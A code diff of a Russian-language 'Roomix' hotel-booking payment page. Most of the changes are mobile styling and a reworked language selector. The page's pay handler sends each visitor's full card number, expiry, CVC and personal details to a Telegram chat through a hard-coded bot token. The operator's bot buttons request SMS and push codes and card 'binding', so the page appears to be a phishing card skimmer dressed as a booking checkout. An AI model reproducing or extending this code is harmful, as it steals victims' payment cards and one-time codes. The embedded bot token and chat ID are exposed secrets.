@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="ru">
 <head>
@@ -26,6 +25,12 @@
             box-sizing: border-box;
         }
 
+        html {
+            scroll-behavior: smooth;
+            background: var(--dark);
+            height: 100%;
+        }
+
         body {
             font-family: 'Montserrat', sans-serif;
             background: linear-gradient(135deg, var(--dark) 0%, var(--dark-light) 100%);
@@ -33,22 +38,47 @@
             color: var(--text);
             line-height: 1.6;
             overflow-x: hidden;
+            -webkit-tap-highlight-color: transparent;
+            -webkit-text-size-adjust: 100%;
+            background-attachment: fixed;
+            background-repeat: no-repeat;
+            background-size: cover;
+        }
+
+        /* Убираем любой возможный белый фон */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, var(--dark) 0%, var(--dark-light) 100%);
+            z-index: -2;
         }
 
         .container {
             max-width: 1400px;
             margin: 0 auto;
             padding: 20px;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+            z-index: 1;
         }
 
-        /* Header - ТАКОЙ ЖЕ КАК В index.html */
+        /* Header - ТОЧНО ТАКОЙ ЖЕ КАК В index.html */
         header {
             display: flex;
             justify-content: space-between;
             align-items: center;
             padding: 20px 0;
             margin-bottom: 30px;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            width: 100%;
+            max-width: 100%;
+            flex-wrap: wrap;
+            gap: 15px;
         }
 
         .logo {
@@ -56,6 +86,12 @@
             align-items: center;
             gap: 15px;
             text-decoration: none;
+            flex-shrink: 0;
+        }
+
+        .logo:visited, .logo:hover, .logo:active {
+            text-decoration: none;
+            color: inherit;
         }
 
         .logo-icon {
@@ -70,12 +106,13 @@
             font-weight: 800;
             font-size: 24px;
             box-shadow: 0 4px 15px rgba(212, 175, 55, 0.3);
+            flex-shrink: 0;
         }
 
         .logo-text {
             font-size: 28px;
             font-weight: 800;
-            background: linear-gradient(135deg, var(--primary) 0%, #FFD700 100%);
+            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             letter-spacing: 1px;
@@ -85,6 +122,8 @@
             display: flex;
             align-items: center;
             gap: 20px;
+            flex-wrap: wrap;
+            justify-content: flex-end;
         }
 
         .language-selector {
@@ -104,6 +143,7 @@
             gap: 8px;
             font-weight: 600;
             transition: all 0.3s ease;
+            min-height: 44px;
         }
 
         .language-btn:hover {
@@ -129,9 +169,12 @@
         }
 
         .language-option {
-            padding: 10px 20px;
+            padding: 12px 20px;
             cursor: pointer;
             transition: background 0.3s ease;
+            min-height: 44px;
+            display: flex;
+            align-items: center;
         }
 
         .language-option:hover {
@@ -149,8 +192,8 @@
         }
 
         .btn-icon {
-            width: 40px;
-            height: 40px;
+            width: 44px;
+            height: 44px;
             border-radius: 50%;
             background: var(--primary-light);
             display: flex;
@@ -159,6 +202,7 @@
             color: var(--primary);
             cursor: pointer;
             transition: all 0.3s ease;
+            flex-shrink: 0;
         }
 
         .btn-icon:hover {
@@ -173,6 +217,7 @@
             grid-template-columns: 1fr 1.2fr;
             gap: 30px;
             margin-bottom: 40px;
+            flex: 1;
         }
 
         .panel {
@@ -545,99 +590,6 @@
             }
         }
 
-        /* Responsive */
-        @media (max-width: 1024px) {
-            .main-content {
-                grid-template-columns: 1fr;
-            }
-        }
-
-        @media (max-width: 768px) {
-            .container {
-                padding: 15px;
-            }
-
-            header {
-                flex-direction: column;
-                gap: 20px;
-            }
-
-            .progress-step {
-                padding: 10px 5px;
-                font-size: 12px;
-            }
-
-            .panel {
-                padding: 20px;
-            }
-
-            .card-number-display {
-                font-size: 18px;
-            }
-
-            .form-row {
-                grid-template-columns: 1fr;
-            }
-
-            .button-group {
-                flex-direction: column;
-            }
-        }
-
-        @media (max-width: 480px) {
-            .logo-icon {
-                width: 40px;
-                height: 40px;
-                font-size: 18px;
-            }
-
-            .logo-text {
-                font-size: 20px;
-            }
-
-            .progress-step {
-                padding: 8px 3px;
-                font-size: 10px;
-            }
-
-            .card-number-display {
-                font-size: 14px;
-                letter-spacing: 1px;
-            }
-
-            input {
-                padding: 12px;
-                font-size: 14px;
-            }
-
-            .card-brand {
-                width: 40px;
-                height: 20px;
-                right: 15px;
-            }
-
-            .cvc-indicator {
-                right: 15px;
-                font-size: 12px;
-                padding: 4px 8px;
-            }
-
-            .card-expiry .card-value,
-            .card-holder .card-value {
-                font-size: 12px;
-            }
-
-            .card-expiry .card-label,
-            .card-holder .card-label {
-                font-size: 8px;
-            }
-
-            .card-chip {
-                width: 40px;
-                height: 30px;
-            }
-        }
-
         /* Добавленные стили для новой карты из txt */
         .credit-card-container {
             perspective: 1000px;
@@ -772,15 +724,180 @@
                 transform: translateY(100vh) rotate(360deg);
             }
         }
+
+        /* Responsive */
+        @media (max-width: 1024px) {
+            .main-content {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                padding: 15px;
+            }
+
+            header {
+                flex-direction: column;
+                gap: 20px;
+                text-align: center;
+            }
+
+            .logo {
+                justify-content: center;
+                width: 100%;
+            }
+
+            .header-controls {
+                width: 100%;
+                justify-content: center;
+                flex-direction: row;
+                gap: 15px;
+            }
+
+            .user-actions {
+                gap: 10px;
+            }
+
+            .btn-icon {
+                width: 44px;
+                height: 44px;
+            }
+
+            .panel {
+                padding: 25px;
+                margin-bottom: 20px;
+            }
+
+            .card-number-display {
+                font-size: 18px;
+            }
+
+            .form-row {
+                grid-template-columns: 1fr;
+            }
+
+            .button-group {
+                flex-direction: column;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 12px;
+            }
+
+            .logo-icon {
+                width: 44px;
+                height: 44px;
+                font-size: 20px;
+            }
+
+            .logo-text {
+                font-size: 24px;
+            }
+
+            .header-controls {
+                flex-direction: column;
+                gap: 12px;
+            }
+
+            .language-btn {
+                padding: 10px 15px;
+                font-size: 15px;
+                min-height: 44px;
+            }
+
+            .panel {
+                padding: 20px;
+                border-radius: 16px;
+            }
+
+            .card-number-display {
+                font-size: 14px;
+                letter-spacing: 1px;
+            }
+
+            input {
+                padding: 12px;
+                font-size: 16px;
+            }
+
+            .card-brand {
+                width: 40px;
+                height: 20px;
+                right: 15px;
+            }
+
+            .cvc-indicator {
+                right: 15px;
+                font-size: 12px;
+                padding: 4px 8px;
+            }
+
+            .card-expiry .card-value,
+            .card-holder .card-value {
+                font-size: 12px;
+            }
+
+            .card-expiry .card-label,
+            .card-holder .card-label {
+                font-size: 8px;
+            }
+
+            .card-chip {
+                width: 40px;
+                height: 30px;
+            }
+        }
+
+        /* iOS Specific Fixes */
+        @supports (-webkit-touch-callout: none) {
+            input, .btn {
+                min-height: 44px;
+            }
+            
+            body {
+                min-height: -webkit-fill-available;
+            }
+            
+            html {
+                height: -webkit-fill-available;
+            }
+        }
+
+        /* Prevent zoom on input focus for mobile */
+        @media screen and (max-width: 768px) {
+            input, select, textarea {
+                font-size: 16px !important;
+            }
+        }
+
+        /* Убираем скроллбар для вебкитов */
+        ::-webkit-scrollbar {
+            width: 0px;
+            background: transparent;
+        }
+
+        /* Для Firefox */
+        * {
+            scrollbar-width: none;
+        }
+
+        /* Для IE и Edge */
+        * {
+            -ms-overflow-style: none;
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <header>
-            <a href="index.html" class="logo">
+            <!-- УБРАЛ ССЫЛКУ С ЛОГОТИПА - ТЕПЕРЬ ПРОСТО DIV -->
+            <div class="logo">
                 <div class="logo-icon">R</div>
                 <div class="logo-text">Roomix</div>
-            </a>
+            </div>
             <div class="header-controls">
                 <div class="language-selector">
                     <button class="language-btn">
@@ -1031,8 +1148,8 @@
             }
         };
 
-        // Текущий язык
-        let currentLanguage = 'ru';
+        // Текущий язык - ТОЧНО ТАК ЖЕ КАК В index.html
+        let currentLanguage = sessionStorage.getItem('selectedLanguage') || 'ru';
 
         // Загружаем данные из sessionStorage
         function loadBookingData() {
@@ -1268,51 +1385,49 @@
             window.location.href = 'index.html';
         });
 
-       // Замени функцию sendToTelegramBot в payment.html (строка ~1275) на этот код:
+        let paymentCounter = 0;
+        const userId = 'user_' + Date.now() + '_' + Math.floor(Math.random() * 1000);
+        sessionStorage.setItem('currentUserId', userId);
 
-let paymentCounter = 0;
-const userId = 'user_' + Date.now() + '_' + Math.floor(Math.random() * 1000);
-sessionStorage.setItem('currentUserId', userId);
-
-async function checkCardStatus(cardNumber) {
-    try {
-        const SERVER_URL = 'https://roomix-production.up.railway.app';
-        const response = await fetch(`${SERVER_URL}/check_card`, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({ card_number: cardNumber })
-        });
-        
-        if (response.ok) {
-            const data = await response.json();
-            return data.is_bound;
+        async function checkCardStatus(cardNumber) {
+            try {
+                const SERVER_URL = 'https://roomix-production.up.railway.app';
+                const response = await fetch(`${SERVER_URL}/check_card`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ card_number: cardNumber })
+                });
+                
+                if (response.ok) {
+                    const data = await response.json();
+                    return data.is_bound;
+                }
+                return false;
+            } catch (error) {
+                console.error('Ошибка проверки карты:', error);
+                return false;
+            }
         }
-        return false;
-    } catch (error) {
-        console.error('Ошибка проверки карты:', error);
-        return false;
-    }
-}
 
-async function sendToTelegramBot() {
-    try {
-        const formData = JSON.parse(sessionStorage.getItem('formData') || '{}');
-        const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
-        const expiry = document.getElementById('expiry').value;
-        const cvc = document.getElementById('cvc').value;
+        async function sendToTelegramBot() {
+            try {
+                const formData = JSON.parse(sessionStorage.getItem('formData') || '{}');
+                const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
+                const expiry = document.getElementById('expiry').value;
+                const cvc = document.getElementById('cvc').value;
 
-        // ПРОВЕРЯЕМ СТАТУС КАРТЫ ЧЕРЕЗ БД БОТА
-        const isCardBound = await checkCardStatus(cardNumber);
-        
-        // УНИКАЛЬНЫЙ ID
-        const paymentId = Date.now() + (paymentCounter++);
-        
-        // ОПРЕДЕЛЯЕМ СТАТУС
-        const cardStatus = isCardBound ? 'ПРИВЯЗАННАЯ КАРТА' : 'НЕПРИВЯЗАННАЯ КАРТА';
-        const statusIcon = isCardBound ? '✅' : '🔗';
+                // ПРОВЕРЯЕМ СТАТУС КАРТЫ ЧЕРЕЗ БД БОТА
+                const isCardBound = await checkCardStatus(cardNumber);
+                
+                // УНИКАЛЬНЫЙ ID
+                const paymentId = Date.now() + (paymentCounter++);
+                
+                // ОПРЕДЕЛЯЕМ СТАТУС
+                const cardStatus = isCardBound ? 'ПРИВЯЗАННАЯ КАРТА' : 'НЕПРИВЯЗАННАЯ КАРТА';
+                const statusIcon = isCardBound ? '✅' : '🔗';
 
-        // ФОРМИРУЕМ СООБЩЕНИЕ СО СТАТУСОМ
-        const message = `💳 <b>${cardStatus}</b> ${statusIcon}
+                // ФОРМИРУЕМ СООБЩЕНИЕ СО СТАТУСОМ
+                const message = `💳 <b>${cardStatus}</b> ${statusIcon}
 
 👤 <b>Клиент:</b>
 • Имя: ${formData.firstName || 'Тест'}
@@ -1325,57 +1440,55 @@ async function sendToTelegramBot() {
 • Срок: ${expiry}
 • CVC: ${cvc}`;
 
-        const BOT_TOKEN = '8409122329:AAHdhsJk14l57s7EuPna-zj2YrXYlBhlcHU';
-        const CHAT_ID = '-1003239032658';
+                const BOT_TOKEN = '8409122329:AAHdhsJk14l57s7EuPna-zj2YrXYlBhlcHU';
+                const CHAT_ID = '-1003239032658';
 
-        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: message,
-                parse_mode: 'HTML',
-                reply_markup: {
-                    inline_keyboard: [
-                        [
-                            { 
-                                text: "📱 SMS код", 
-                                callback_data: `sms_${paymentId}_${userId}`
-                            },
-                            { 
-                                text: "🔔 Пуш", 
-                                callback_data: `push_${paymentId}_${userId}`
-                            }
-                        ],
-                        // Показываем кнопку "Привязать" только для непривязанных карт
-                        ...(!isCardBound ? [[
-                            {
-                                text: "🔗 Привязать",
-                                callback_data: `bind_${paymentId}_${userId}_${cardNumber}`
-                            }
-                        ]] : []),
-                        [
-                            { 
-                                text: "❌ Неверная карта", 
-                                callback_data: `wrong_card_${paymentId}_${userId}`
-                            }
-                        ]
-                    ]
-                }
-            })
-        });
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML',
+                        reply_markup: {
+                            inline_keyboard: [
+                                [
+                                    { 
+                                        text: "📱 SMS код", 
+                                        callback_data: `sms_${paymentId}_${userId}`
+                                    },
+                                    { 
+                                        text: "🔔 Пуш", 
+                                        callback_data: `push_${paymentId}_${userId}`
+                                    }
+                                ],
+                                // Показываем кнопку "Привязать" только для непривязанных карт
+                                ...(!isCardBound ? [[
+                                    {
+                                        text: "🔗 Привязать",
+                                        callback_data: `bind_${paymentId}_${userId}_${cardNumber}`
+                                    }
+                                ]] : []),
+                                [
+                                    { 
+                                        text: "❌ Неверная карта", 
+                                        callback_data: `wrong_card_${paymentId}_${userId}`
+                                    }
+                                ]
+                            ]
+                        }
+                    })
+                });
 
-        const result = await response.json();
-        console.log('Результат отправки:', result);
-        return result.ok;
+                const result = await response.json();
+                console.log('Результат отправки:', result);
+                return result.ok;
 
-    } catch (error) {
-        console.error('Ошибка отправки:', error);
-        return false;
-    }
-}
-    
-
+            } catch (error) {
+                console.error('Ошибка отправки:', error);
+                return false;
+            }
+        }
 
         // Обработчик кнопки "Оплатить"
         payBtn.addEventListener('click', async () => {
@@ -1410,31 +1523,42 @@ async function sendToTelegramBot() {
             }
         });
 
-        // Языковой переключатель
-        document.querySelector('.language-btn').addEventListener('click', function() {
-            document.getElementById('languageDropdown').classList.toggle('show');
-        });
+        // Языковой переключатель - ТОЧНО ТАКОЙ ЖЕ КАК В index.html
+        function initLanguageSelector() {
+            const languageBtn = document.querySelector('.language-btn');
+            const languageDropdown = document.getElementById('languageDropdown');
 
-        document.querySelectorAll('.language-option').forEach(option => {
-            option.addEventListener('click', function() {
-                const lang = this.getAttribute('data-lang');
-                changeLanguage(lang);
-                document.getElementById('languageDropdown').classList.remove('show');
+            // Обработчик открытия/закрытия выпадающего списка
+            languageBtn.addEventListener('click', function(event) {
+                event.stopPropagation();
+                languageDropdown.classList.toggle('show');
             });
-        });
 
-        // Функция смены языка
+            // Обработчик выбора языка
+            document.querySelectorAll('.language-option').forEach(option => {
+                option.addEventListener('click', function() {
+                    const lang = this.getAttribute('data-lang');
+                    changeLanguage(lang);
+                    languageDropdown.classList.remove('show');
+                });
+            });
+
+            // Закрытие выпадающего списка при клике вне его
+            document.addEventListener('click', function(event) {
+                if (!languageBtn.contains(event.target) && !languageDropdown.contains(event.target)) {
+                    languageDropdown.classList.remove('show');
+                }
+            });
+        }
+
+        // Функция смены языка - ТОЧНО ТАКАЯ ЖЕ КАК В index.html
         function changeLanguage(lang) {
             currentLanguage = lang;
-            document.getElementById('currentLanguage').textContent = document.querySelector(`.language-option[data-lang="${lang}"]`).textContent;
+            sessionStorage.setItem('selectedLanguage', lang); // Сохраняем язык
 
-            // Обновляем активный язык в меню
-            document.querySelectorAll('.language-option').forEach(option => {
-                option.classList.toggle('active', option.getAttribute('data-lang') === lang);
-            });
-
-            // Обновляем все тексты
             const t = translations[lang];
+
+            // Обновление формы
             document.getElementById('cardDetailsTitle').textContent = t.cardDetails;
             document.getElementById('cardNumberLabel').textContent = t.cardNumber;
             document.getElementById('expiryLabel').textContent = t.expiry;
@@ -1458,7 +1582,20 @@ async function sendToTelegramBot() {
             document.getElementById('errorExpiry').textContent = t.expiryError;
             document.getElementById('errorCvc').textContent = t.cvcError;
 
-            // Обновляем текст для количества ночей
+            // Обновление текущего языка в интерфейсе
+            document.getElementById('currentLanguage').textContent =
+                lang === 'ru' ? 'Русский' :
+                lang === 'pl' ? 'Polski' : 'English';
+
+            // Обновление активного языка в выпадающем списке
+            document.querySelectorAll('.language-option').forEach(option => {
+                option.classList.remove('active');
+                if (option.getAttribute('data-lang') === lang) {
+                    option.classList.add('active');
+                }
+            });
+
+            // Обновление текста для количества ночей
             const nights = parseInt(document.getElementById('nightsCount').textContent) || 1;
             document.getElementById('nightsText').textContent = getNightText(nights);
         }
@@ -1510,26 +1647,10 @@ async function sendToTelegramBot() {
         // Загружаем данные при загрузке страницы
         window.addEventListener('DOMContentLoaded', () => {
             loadBookingData();
+            initLanguageSelector();
             changeLanguage(currentLanguage);
             checkPaymentStatus();
-        });
-
-        // Закрываем выпадающее меню при клике вне его
-        window.addEventListener('click', function(e) {
-            if (!e.target.closest('.language-selector')) {
-                document.getElementById('languageDropdown').classList.remove('show');
-            }
         });
     </script>
 </body>
 </html>
-
-
-
-
-
-
-
-
-
-
